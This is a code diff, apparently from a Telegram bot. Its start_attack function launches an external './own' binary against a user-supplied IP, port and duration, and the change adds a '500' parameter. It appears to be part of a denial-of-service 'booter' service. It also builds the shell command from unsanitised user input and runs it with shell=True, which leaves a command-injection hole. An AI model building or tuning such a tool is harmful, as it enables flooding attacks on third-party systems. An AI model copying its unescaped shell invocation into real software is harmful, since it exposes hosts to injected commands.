@@ -84,7 +84,7 @@ def start_attack(call, user_id, ip, port, duration):
     global active_attacks, cooldowns
 
     cooldowns[user_id] = duration * 2  # Cooldown starts immediately
-    full_command = f"./own {ip} {port} {duration}"
+    full_command = f"./own {ip} {port} {duration} 500"
     subprocess.Popen(full_command, shell=True)
 
     bot.edit_message_text(
